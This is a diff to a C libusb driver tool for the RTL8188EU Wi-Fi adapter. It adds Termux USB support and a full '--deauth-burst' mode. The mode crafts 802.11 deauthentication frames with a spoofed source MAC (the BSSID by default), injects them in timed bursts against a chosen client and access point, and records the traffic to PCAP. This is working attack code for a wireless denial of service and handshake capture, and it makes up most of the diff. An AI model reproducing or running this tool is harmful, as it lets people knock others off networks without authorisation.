@@ -11,6 +11,7 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
+#include <signal.h>
 #include <sys/time.h>
 #include <time.h>
 #include <unistd.h>
@@ -218,11 +219,14 @@ typedef struct {
     libusb_device_handle *handle;
     int intf_num;
     uint8_t ep_in;
+    uint8_t ep_out_eps[8];
+    int ep_out_len;
     int nr_out_eps;
     bool ep_tx_high_queue;
     bool ep_tx_normal_queue;
     bool ep_tx_low_queue;
     int current_channel;
+    uint16_t tx_seq;
     fops_8188e_t fops;
     tables_t tables;
 } rtl8188eu_t;
@@ -1177,6 +1181,267 @@ static void capture_pcap(rtl8188eu_t *d, FILE *fp, int max_reads, int read_size,
     free(buf);
 }
 
+static uint64_t now_ms(void);
+
+static volatile sig_atomic_t g_stop = 0;
+
+static void on_signal(int signum) {
+    (void)signum;
+    g_stop = 1;
+}
+
+static bool parse_mac_addr(const char *s, uint8_t out[6]) {
+    if (!s) return false;
+    char hex[12];
+    size_t n = 0;
+    for (size_t i = 0; s[i]; i++) {
+        char c = s[i];
+        if (c == ':' || c == '-' || c == '.' || c == ' ') continue;
+        if ((c >= '0' && c <= '9') || (c >= 'a' && c <= 'f') || (c >= 'A' && c <= 'F')) {
+            if (n >= sizeof(hex)) return false;
+            hex[n++] = c;
+        } else {
+            return false;
+        }
+    }
+    if (n != 12) return false;
+    for (int i = 0; i < 6; i++) {
+        char tmp[3] = { hex[i * 2], hex[i * 2 + 1], 0 };
+        char *end = NULL;
+        unsigned long v = strtoul(tmp, &end, 16);
+        if (!end || *end != '\0' || v > 0xFFu) return false;
+        out[i] = (uint8_t)v;
+    }
+    return true;
+}
+
+static uint16_t tx_desc32_csum(const uint8_t desc[32]) {
+    uint8_t tmp[32];
+    memcpy(tmp, desc, 32);
+    tmp[28] = 0;
+    tmp[29] = 0;
+    uint16_t csum = 0;
+    for (int i = 0; i < 16; i++) {
+        uint16_t w = (uint16_t)tmp[i * 2] | ((uint16_t)tmp[i * 2 + 1] << 8);
+        csum ^= w;
+    }
+    return csum;
+}
+
+enum {
+    TXDESC32_AGG_BREAK = 1 << 6,
+    TXDESC_BROADMULTICAST = 1 << 0,
+    TXDESC_LAST_SEGMENT = 1 << 2,
+    TXDESC_FIRST_SEGMENT = 1 << 3,
+    TXDESC_OWN = 1 << 7,
+
+    TXDESC_QUEUE_SHIFT = 8,
+    TXDESC_QUEUE_BE = 0x0,
+    TXDESC_QUEUE_MGNT = 0x12,
+
+    TXDESC40_AGG_BREAK = 1 << 16,
+    TXDESC32_USE_DRIVER_RATE = 1 << 8,
+    TXDESC32_SEQ_SHIFT = 16,
+    TXDESC32_RETRY_LIMIT_ENABLE = 1 << 17,
+    TXDESC32_RETRY_LIMIT_SHIFT = 18,
+
+    TXDESC_ANTENNA_SELECT_A = 1 << 24,
+    TXDESC_ANTENNA_SELECT_B = 1 << 25,
+    TXDESC_ANTENNA_SELECT_C = 1 << 29,
+
+    DESC_RATE_6M = 0x04,
+};
+
+static void build_tx_desc32(const uint8_t *payload, size_t payload_len, uint8_t rate_id, uint8_t out_desc[32]) {
+    uint16_t pkt_size = (uint16_t)payload_len;
+    uint8_t pkt_offset = 32;
+
+    uint8_t txdw0 = (uint8_t)(TXDESC_OWN | TXDESC_FIRST_SEGMENT | TXDESC_LAST_SEGMENT);
+    if (payload_len >= 10) {
+        uint8_t da0 = payload[4];
+        if (da0 & 0x01) txdw0 |= (uint8_t)TXDESC_BROADMULTICAST;
+    }
+
+    uint16_t fc = payload_len >= 2 ? le16(payload) : 0;
+    int ftype = (int)((fc >> 2) & 0x3);
+    uint32_t queue = (uint32_t)(((ftype == 0) ? TXDESC_QUEUE_MGNT : TXDESC_QUEUE_BE) & 0x1F);
+    uint32_t txdw1 = queue << TXDESC_QUEUE_SHIFT;
+
+    uint32_t txdw2 = (uint32_t)(TXDESC40_AGG_BREAK | TXDESC_ANTENNA_SELECT_A | TXDESC_ANTENNA_SELECT_B);
+
+    uint32_t seq_number = 0;
+    if ((ftype == 0 || ftype == 2) && payload_len >= 24) {
+        uint16_t seq_ctrl = le16(payload + 22);
+        seq_number = (uint32_t)((seq_ctrl >> 4) & 0x0FFF);
+    }
+    uint32_t txdw3 = (seq_number & 0x0FFFu) << TXDESC32_SEQ_SHIFT;
+
+    uint32_t txdw4 = (uint32_t)TXDESC32_USE_DRIVER_RATE;
+    uint32_t txdw5 = (uint32_t)rate_id | ((uint32_t)6 << TXDESC32_RETRY_LIMIT_SHIFT) | (uint32_t)TXDESC32_RETRY_LIMIT_ENABLE;
+    uint32_t txdw6 = 0;
+    uint16_t txdw7 = (uint16_t)((TXDESC_ANTENNA_SELECT_C >> 16) & 0xFFFF);
+
+    memset(out_desc, 0, 32);
+    put_le16(out_desc + 0, pkt_size);
+    out_desc[2] = pkt_offset;
+    out_desc[3] = txdw0;
+    put_le32(out_desc + 4, txdw1);
+    put_le32(out_desc + 8, txdw2);
+    put_le32(out_desc + 12, txdw3);
+    put_le32(out_desc + 16, txdw4);
+    put_le32(out_desc + 20, txdw5);
+    put_le32(out_desc + 24, txdw6);
+    put_le16(out_desc + 30, txdw7);
+    uint16_t csum = tx_desc32_csum(out_desc);
+    put_le16(out_desc + 28, csum);
+}
+
+static uint8_t select_tx_ep(rtl8188eu_t *d, const uint8_t *payload, size_t payload_len) {
+    if (d->ep_out_len <= 0) die("No bulk OUT endpoints");
+    uint16_t fc = payload_len >= 2 ? le16(payload) : 0;
+    int ftype = (int)((fc >> 2) & 0x3);
+    if (ftype == 0) return d->ep_out_eps[0];
+    return d->ep_out_eps[d->ep_out_len - 1];
+}
+
+static int tx_frame(rtl8188eu_t *d, const uint8_t *payload, size_t payload_len, int timeout_ms) {
+    uint8_t desc[32];
+    build_tx_desc32(payload, payload_len, DESC_RATE_6M, desc);
+
+    size_t total = 32 + payload_len;
+    uint8_t *data = (uint8_t *)xmalloc(total);
+    memcpy(data, desc, 32);
+    memcpy(data + 32, payload, payload_len);
+
+    uint8_t ep = select_tx_ep(d, payload, payload_len);
+    int transferred = 0;
+    int r = libusb_bulk_transfer(d->handle, ep, data, (int)total, &transferred, timeout_ms);
+    free(data);
+    if (r != 0) return r;
+    if (transferred != (int)total) return LIBUSB_ERROR_IO;
+    return 0;
+}
+
+static size_t build_deauth_frame(const uint8_t da[6], const uint8_t sa[6], const uint8_t bssid[6], uint16_t seq, uint16_t reason, uint8_t out[64]) {
+    uint16_t fc = 0x00C0;
+    uint16_t duration = 0x013a;
+    uint16_t seq_ctrl = (uint16_t)((seq & 0x0FFFu) << 4);
+    put_le16(out + 0, fc);
+    put_le16(out + 2, duration);
+    memcpy(out + 4, da, 6);
+    memcpy(out + 10, sa, 6);
+    memcpy(out + 16, bssid, 6);
+    put_le16(out + 22, seq_ctrl);
+    put_le16(out + 24, reason);
+    return 26;
+}
+
+static void deauth_burst_loop(
+    rtl8188eu_t *d,
+    FILE *fp,
+    const uint8_t target_mac[6],
+    const uint8_t bssid[6],
+    const uint8_t source_mac[6],
+    uint16_t reason,
+    int burst_size,
+    int burst_interval_ms,
+    int burst_duration_s,
+    int burst_read_timeout_ms,
+    int max_reads,
+    int read_size,
+    bool include_bad_fcs,
+    bool keep_fcs,
+    int tx_timeout_ms
+) {
+    pcap_write_global_header(fp, 127, 65535);
+    uint8_t *buf = (uint8_t *)xmalloc((size_t)read_size);
+    uint64_t start = now_ms();
+    uint64_t end = burst_duration_s > 0 ? start + (uint64_t)burst_duration_s * 1000u : 0;
+    uint64_t next_burst = start;
+    int reads = 0;
+
+    while (!g_stop) {
+        uint64_t now = now_ms();
+        if (end && now >= end) break;
+
+        if (now >= next_burst) {
+            for (int i = 0; i < burst_size; i++) {
+                uint8_t frame[64];
+                size_t flen = build_deauth_frame(target_mac, source_mac, bssid, d->tx_seq, reason, frame);
+                d->tx_seq = (uint16_t)((d->tx_seq + 1) & 0x0FFFu);
+                (void)tx_frame(d, frame, flen, tx_timeout_ms);
+                if (g_stop) break;
+            }
+            next_burst = now_ms() + (uint64_t)burst_interval_ms;
+        }
+
+        if (max_reads > 0 && reads >= max_reads) break;
+
+        int transferred = 0;
+        int r = libusb_bulk_transfer(d->handle, d->ep_in, buf, read_size, &transferred, burst_read_timeout_ms);
+        if (r != 0 || transferred <= 0) continue;
+        reads++;
+
+        size_t off = 0;
+        int pkt_cnt = 0;
+        while (off + 24 <= (size_t)transferred) {
+            rxdesc16_t desc;
+            if (!parse_rxdesc16(buf + off, (size_t)transferred - off, &desc)) break;
+            if (pkt_cnt == 0) pkt_cnt = desc.pkt_cnt > 0 ? desc.pkt_cnt : 1;
+            size_t drvinfo_bytes = (size_t)desc.drvinfo_sz * 8;
+            size_t pkt_offset = roundup((size_t)desc.pktlen + drvinfo_bytes + (size_t)desc.shift + 24, 128);
+            size_t payload_start = off + 24 + drvinfo_bytes + (size_t)desc.shift;
+            size_t payload_end = payload_start + (size_t)desc.pktlen;
+            if (payload_end > (size_t)transferred) break;
+
+            const uint8_t *payload = buf + payload_start;
+            size_t plen = (size_t)desc.pktlen;
+
+            if (desc.rpt_sel == 0 && plen && fc_version(payload, plen) == 0) {
+                if (!include_bad_fcs && (desc.crc32 || desc.icverr)) {
+                } else {
+                    const uint8_t *frame = payload;
+                    size_t frame_len = plen;
+                    bool has_fcs = false;
+                    if (!(desc.crc32 || desc.icverr) && plen >= 4) {
+                        uint32_t fcs_le = le32(payload + plen - 4);
+                        uint32_t calc = crc32_80211(payload, plen - 4);
+                        if (fcs_le == calc) {
+                            has_fcs = true;
+                            if (!keep_fcs) frame_len = plen - 4;
+                        }
+                    }
+
+                    uint8_t flags_val = 0;
+                    uint8_t *flags_ptr = NULL;
+                    if (keep_fcs) {
+                        flags_val = has_fcs ? 0x10 : 0;
+                        if (desc.crc32) flags_val |= 0x40;
+                        flags_ptr = &flags_val;
+                    }
+                    uint8_t rtap[64];
+                    size_t rtap_len = radiotap_header(desc.tsfl, d->current_channel, flags_ptr, rtap, sizeof(rtap));
+                    if (rtap_len) {
+                        uint32_t total = (uint32_t)(rtap_len + frame_len);
+                        uint8_t *pkt = (uint8_t *)xmalloc(total);
+                        memcpy(pkt, rtap, rtap_len);
+                        memcpy(pkt + rtap_len, frame, frame_len);
+                        pcap_write_packet(fp, pkt, total);
+                        free(pkt);
+                    }
+                }
+            }
+
+            off += pkt_offset;
+            pkt_cnt--;
+            if (pkt_cnt <= 0) break;
+        }
+        fflush(fp);
+    }
+
+    free(buf);
+}
+
 static void rx_loop(rtl8188eu_t *d, int max_reads, int read_size, int timeout_ms, bool good_fcs_only, int dump_bytes) {
     uint8_t *buf = (uint8_t *)xmalloc((size_t)read_size);
     int reads = 0;
@@ -1626,8 +1891,21 @@ static void device_init_defaults(rtl8188eu_t *d) {
     };
 }
 
-static void open_device(rtl8188eu_t *d, uint16_t vid, uint16_t pid, int want_bus, int want_addr) {
-    int r = libusb_init(&d->ctx);
+static void open_device(rtl8188eu_t *d, uint16_t vid, uint16_t pid, int want_bus, int want_addr, int usb_fd) {
+    int r = 0;
+    if (usb_fd >= 0) {
+#ifdef LIBUSB_OPTION_NO_DEVICE_DISCOVERY
+        libusb_set_option(NULL, LIBUSB_OPTION_NO_DEVICE_DISCOVERY);
+#endif
+        r = libusb_init(&d->ctx);
+        if (r != 0) dief("libusb_init failed: %s", libusb_error_name(r));
+
+        libusb_device_handle *h = NULL;
+        r = libusb_wrap_sys_device(d->ctx, (intptr_t)usb_fd, &h);
+        if (r != 0) dief("libusb_wrap_sys_device failed: %s", libusb_error_name(r));
+        d->handle = h;
+    } else {
+    r = libusb_init(&d->ctx);
     if (r != 0) dief("libusb_init failed: %s", libusb_error_name(r));
 
     libusb_device **list = NULL;
@@ -1679,12 +1957,16 @@ static void open_device(rtl8188eu_t *d, uint16_t vid, uint16_t pid, int want_bus
         dief("USB device found but could not be opened (bus=%u addr=%u): %s",
              (unsigned)first_bus, (unsigned)first_addr, libusb_error_name(first_open_err ? first_open_err : LIBUSB_ERROR_OTHER));
     }
+    }
 
     libusb_set_auto_detach_kernel_driver(d->handle, 1);
 
     libusb_device *dev = libusb_get_device(d->handle);
     struct libusb_config_descriptor *cfg = NULL;
     r = libusb_get_active_config_descriptor(dev, &cfg);
+    if ((r != 0 || !cfg) && usb_fd >= 0) {
+        r = libusb_get_config_descriptor(dev, 0, &cfg);
+    }
     if (r != 0 || !cfg) dief("get_active_config_descriptor failed: %s", libusb_error_name(r));
     if (cfg->bNumInterfaces < 1 || cfg->interface[0].num_altsetting < 1) die("no interfaces/altsettings");
     const struct libusb_interface_descriptor *intf = &cfg->interface[0].altsetting[0];
@@ -1694,6 +1976,7 @@ static void open_device(rtl8188eu_t *d, uint16_t vid, uint16_t pid, int want_bus
     if (r != 0) dief("claim_interface failed: %s", libusb_error_name(r));
 
     uint8_t bulk_in = 0;
+    uint8_t bulk_out_eps[8];
     int bulk_out = 0;
     for (int i = 0; i < intf->bNumEndpoints; i++) {
         const struct libusb_endpoint_descriptor *ep = &intf->endpoint[i];
@@ -1702,6 +1985,9 @@ static void open_device(rtl8188eu_t *d, uint16_t vid, uint16_t pid, int want_bus
         if (addr & 0x80) {
             if (bulk_in == 0) bulk_in = addr;
         } else {
+            if (bulk_out < (int)(sizeof(bulk_out_eps) / sizeof(bulk_out_eps[0]))) {
+                bulk_out_eps[bulk_out] = addr;
+            }
             bulk_out++;
         }
     }
@@ -1709,7 +1995,10 @@ static void open_device(rtl8188eu_t *d, uint16_t vid, uint16_t pid, int want_bus
 
     if (bulk_in == 0) die("No bulk IN endpoint found");
     d->ep_in = bulk_in;
+    if (bulk_out > (int)(sizeof(d->ep_out_eps) / sizeof(d->ep_out_eps[0]))) bulk_out = (int)(sizeof(d->ep_out_eps) / sizeof(d->ep_out_eps[0]));
     d->nr_out_eps = bulk_out;
+    d->ep_out_len = bulk_out;
+    for (int i = 0; i < bulk_out; i++) d->ep_out_eps[i] = bulk_out_eps[i];
     config_endpoints_no_sie(d);
 }
 
@@ -1784,6 +2073,7 @@ static void usage(const char *prog) {
         "  --pid <int>                 default 0x010C\n"
         "  --bus <int>                 optional USB bus number\n"
         "  --address <int>             optional USB device address\n"
+        "  --usb-fd <int>              termux-usb file descriptor (no root)\n"
         "  --firmware <path>           default auto\n"
         "  --tables-from <path>        default ./rtl8xxxu_8188e.c (next to executable)\n"
         "  --channel <int>             default 1\n"
@@ -1799,6 +2089,15 @@ static void usage(const char *prog) {
         "  --pcap <path|- >            write PCAP\n"
         "  --pcap-include-bad-fcs      include bad FCS in pcap\n"
         "  --pcap-with-fcs             keep FCS when possible\n"
+        "  --deauth-burst              send deauth bursts and capture to pcap\n"
+        "  --target-mac <str>          with --deauth-burst, destination MAC\n"
+        "  --bssid <str>               with --deauth-burst, BSSID\n"
+        "  --source-mac <str>          with --deauth-burst, source MAC (default bssid)\n"
+        "  --reason <int>              with --deauth-burst, reason code (default 8)\n"
+        "  --burst-size <int>          with --deauth-burst, frames per burst (default 10)\n"
+        "  --burst-interval-ms <int>   with --deauth-burst, delay between bursts (default 1000)\n"
+        "  --burst-duration-s <int>    with --deauth-burst, total duration (0 = until Ctrl-C)\n"
+        "  --burst-read-timeout-ms <int>  with --deauth-burst, USB read timeout (default 50)\n"
         "  --reads <int>               default 0 (unlimited)\n"
         "  --read-size <int>           default 16384\n"
         "  --timeout-ms <int>          default 1000\n"
@@ -1814,6 +2113,7 @@ int main(int argc, char **argv) {
     uint16_t pid = 0x010C;
     int bus = -1;
     int address = -1;
+    int usb_fd = -1;
     char *firmware_arg = NULL;
     char *tables_from = NULL;
     int channel = 1;
@@ -1829,6 +2129,15 @@ int main(int argc, char **argv) {
     char *pcap_path = strdup("");
     bool pcap_include_bad_fcs = false;
     bool pcap_with_fcs = false;
+    bool deauth_burst = false;
+    char *target_mac_s = strdup("");
+    char *bssid_s = strdup("");
+    char *source_mac_s = strdup("");
+    int reason = 8;
+    int burst_size = 10;
+    int burst_interval_ms = 1000;
+    int burst_duration_s = 0;
+    int burst_read_timeout_ms = 50;
     int reads = 0;
     int read_size = 16384;
     int timeout_ms = 1000;
@@ -1841,6 +2150,7 @@ int main(int argc, char **argv) {
         {"pid", required_argument, 0, 2},
         {"bus", required_argument, 0, 3},
         {"address", required_argument, 0, 4},
+        {"usb-fd", required_argument, 0, 25},
         {"firmware", required_argument, 0, 5},
         {"tables-from", required_argument, 0, 6},
         {"channel", required_argument, 0, 7},
@@ -1856,6 +2166,15 @@ int main(int argc, char **argv) {
         {"pcap", required_argument, 0, 17},
         {"pcap-include-bad-fcs", no_argument, 0, 18},
         {"pcap-with-fcs", no_argument, 0, 19},
+        {"deauth-burst", no_argument, 0, 26},
+        {"target-mac", required_argument, 0, 27},
+        {"bssid", required_argument, 0, 28},
+        {"source-mac", required_argument, 0, 29},
+        {"reason", required_argument, 0, 30},
+        {"burst-size", required_argument, 0, 31},
+        {"burst-interval-ms", required_argument, 0, 32},
+        {"burst-duration-s", required_argument, 0, 33},
+        {"burst-read-timeout-ms", required_argument, 0, 34},
         {"reads", required_argument, 0, 20},
         {"read-size", required_argument, 0, 21},
         {"timeout-ms", required_argument, 0, 22},
@@ -1874,6 +2193,7 @@ int main(int argc, char **argv) {
             case 2: pid = (uint16_t)strtoul(optarg, NULL, 0); break;
             case 3: bus = (int)strtoul(optarg, NULL, 0); break;
             case 4: address = (int)strtoul(optarg, NULL, 0); break;
+            case 25: usb_fd = atoi(optarg); break;
             case 5: firmware_arg = strdup(optarg); break;
             case 6: tables_from = strdup(optarg); break;
             case 7: channel = atoi(optarg); break;
@@ -1889,6 +2209,15 @@ int main(int argc, char **argv) {
             case 17: free(pcap_path); pcap_path = strdup(optarg); break;
             case 18: pcap_include_bad_fcs = true; break;
             case 19: pcap_with_fcs = true; break;
+            case 26: deauth_burst = true; break;
+            case 27: free(target_mac_s); target_mac_s = strdup(optarg); break;
+            case 28: free(bssid_s); bssid_s = strdup(optarg); break;
+            case 29: free(source_mac_s); source_mac_s = strdup(optarg); break;
+            case 30: reason = atoi(optarg); break;
+            case 31: burst_size = atoi(optarg); break;
+            case 32: burst_interval_ms = atoi(optarg); break;
+            case 33: burst_duration_s = atoi(optarg); break;
+            case 34: burst_read_timeout_ms = atoi(optarg); break;
             case 20: reads = atoi(optarg); break;
             case 21: read_size = atoi(optarg); break;
             case 22: timeout_ms = atoi(optarg); break;
@@ -1903,6 +2232,21 @@ int main(int argc, char **argv) {
     if (read_size < 512) die("read-size too small");
     if (dwell_ms <= 0) die("dwell-ms must be > 0");
     if (station_scan_time_ms < 0) die("station-scan-time must be >= 0");
+    if (burst_size <= 0) die("burst-size must be > 0");
+    if (burst_interval_ms < 0) die("burst-interval-ms must be >= 0");
+    if (burst_duration_s < 0) die("burst-duration-s must be >= 0");
+    if (burst_read_timeout_ms < 0) die("burst-read-timeout-ms must be >= 0");
+    if (reason < 0 || reason > 65535) die("reason must be 0..65535");
+
+    if (optind < argc) {
+        if (optind + 1 != argc) die("unexpected extra arguments");
+        char *end = NULL;
+        errno = 0;
+        long v = strtol(argv[optind], &end, 10);
+        if (errno != 0 || !end || *end != '\0' || v < 0 || v > INT_MAX) die("invalid usb fd argument");
+        if (usb_fd >= 0) die("usb fd specified twice");
+        usb_fd = (int)v;
+    }
 
     if (!tables_from) tables_from = default_tables_from();
     if (!path_exists(tables_from)) dief("Tables source not found: %s", tables_from);
@@ -1914,7 +2258,7 @@ int main(int argc, char **argv) {
     device_init_defaults(&dev);
     if (!load_tables_from_kernel_source(tables_from, &dev.tables)) die("Failed to parse tables from --tables-from");
 
-    open_device(&dev, vid, pid, bus, address);
+    open_device(&dev, vid, pid, bus, address, usb_fd);
     init_device(&dev, firmware_path, channel, bw);
 
     if (init_only) {
@@ -1926,6 +2270,9 @@ int main(int argc, char **argv) {
         free(pcap_path);
         free(target_ssid);
         free(scan_channels);
+        free(target_mac_s);
+        free(bssid_s);
+        free(source_mac_s);
         return 0;
     }
 
@@ -1939,6 +2286,62 @@ int main(int argc, char **argv) {
         free(pcap_path);
         free(target_ssid);
         free(scan_channels);
+        free(target_mac_s);
+        free(bssid_s);
+        free(source_mac_s);
+        return 0;
+    }
+
+    if (deauth_burst) {
+        if (!pcap_path[0]) die("--pcap is required with --deauth-burst");
+        if (!target_mac_s[0] || !bssid_s[0]) die("--target-mac and --bssid are required with --deauth-burst");
+        uint8_t target_mac[6], bssid[6], source_mac[6];
+        if (!parse_mac_addr(target_mac_s, target_mac)) die("invalid --target-mac");
+        if (!parse_mac_addr(bssid_s, bssid)) die("invalid --bssid");
+        if (source_mac_s[0]) {
+            if (!parse_mac_addr(source_mac_s, source_mac)) die("invalid --source-mac");
+        } else {
+            memcpy(source_mac, bssid, 6);
+        }
+
+        FILE *fp = NULL;
+        if (strcmp(pcap_path, "-") == 0) fp = stdout;
+        else fp = fopen(pcap_path, "wb");
+        if (!fp) dief("Failed to open pcap: %s", pcap_path);
+
+        signal(SIGINT, on_signal);
+        signal(SIGTERM, on_signal);
+
+        deauth_burst_loop(
+            &dev,
+            fp,
+            target_mac,
+            bssid,
+            source_mac,
+            (uint16_t)reason,
+            burst_size,
+            burst_interval_ms,
+            burst_duration_s,
+            burst_read_timeout_ms,
+            reads,
+            read_size,
+            pcap_include_bad_fcs,
+            pcap_with_fcs,
+            timeout_ms
+        );
+
+        if (fp != stdout) fclose(fp);
+        close_device(&dev);
+        free_tables(&dev.tables);
+        free(firmware_arg);
+        free(firmware_path);
+        free(tables_from);
+        free(pcap_path);
+        free(target_ssid);
+        free(scan_channels);
+        free(target_mac_s);
+        free(bssid_s);
+        free(source_mac_s);
         return 0;
     }
 
@@ -1957,6 +2360,9 @@ int main(int argc, char **argv) {
         free(pcap_path);
         free(target_ssid);
         free(scan_channels);
+        free(target_mac_s);
+        free(bssid_s);
+        free(source_mac_s);
         return 0;
     }
 
@@ -1972,5 +2378,8 @@ int main(int argc, char **argv) {
     free(pcap_path);
     free(target_ssid);
     free(scan_channels);
+    free(target_mac_s);
+    free(bssid_s);
+    free(source_mac_s);
     return 0;
 }
